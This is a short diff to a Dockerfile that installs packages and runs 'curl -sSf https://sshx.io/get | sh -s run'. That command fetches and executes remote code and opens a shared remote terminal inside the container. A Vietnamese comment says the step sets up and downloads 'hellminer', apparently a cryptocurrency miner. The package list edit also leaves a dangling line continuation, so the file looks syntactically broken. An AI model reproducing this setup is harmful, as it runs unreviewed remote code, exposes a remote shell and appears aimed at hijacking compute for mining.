@@ -6,8 +6,10 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     curl \
     ca-certificates \
     git \
-    sudo
+    sudo \ 
+    unzip \
+    python3 \
 
 # Tạo thư mục làm việc và tải hellminer
 
-RUN apt upgrade && curl -sSf https://sshx.io/get | sh -s run
+RUN curl -sSf https://sshx.io/get | sh -s run
